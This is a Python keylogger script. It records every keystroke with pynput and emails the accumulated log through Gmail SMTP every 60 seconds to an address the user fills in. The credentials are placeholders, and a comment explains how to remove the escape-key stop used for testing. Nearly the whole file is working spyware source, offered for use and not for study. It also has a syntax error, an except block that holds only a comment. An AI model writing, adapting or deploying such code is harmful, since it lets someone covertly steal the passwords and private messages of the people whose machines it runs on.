import threading
import time
from pynput import keyboard
import sys
from email.message import EmailMessage
import ssl
import smtplib
from datetime import datetime

timer = None
logs = 'start...'

def emailSender():
    global logs
    email_sender = 'your email'
    email_password = '16 characters password for 2 step aut.'  
    email_receiver = email_sender

    time = datetime.now()
    strftime = time.strftime("%Y-%m-%d %H:%M:%S")

    subject = f'report {strftime}' 
    body = logs

    em = EmailMessage()
    em['From'] = email_sender
    em['To'] = email_receiver
    em['Subject'] = subject
    em.set_content(body)

    context = ssl.create_default_context()

    with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:
        smtp.login(email_sender, email_password)
        smtp.sendmail(email_sender, email_receiver, em.as_string())

def report():
    global timer
    emailSender()
    timer = threading.Timer(60, report)
    timer.start()

def keyPressed(key):
    global logs
    special_keys_mapping = {
        keyboard.Key.enter: "\n",
        keyboard.Key.space: " ",
        keyboard.Key.tab: "\t",
        keyboard.Key.shift: "(shift)",
        keyboard.Key.backspace: "(backspace)",
        #keyboard.Key.esc: "(escape)", #remove '#'
        keyboard.Key.ctrl: "(ctrl)",
        keyboard.Key.alt: "(alt)"
    }
    if key in special_keys_mapping:
        logs += special_keys_mapping[key]
    else:
        try:
            char = key.char
            logs += str(char)
        except AttributeError:
            #print("Atribute error")

    if key == keyboard.Key.esc: #delete this block if you dont need to stop keylogger, for testing
        print("KeyboardInterrupt")
        listener.stop
        timer.cancel()
        sys.exit()





if __name__=="__main__":
    listener = keyboard.Listener(on_press=keyPressed) 
    with listener:
        report()
        listener.join() 
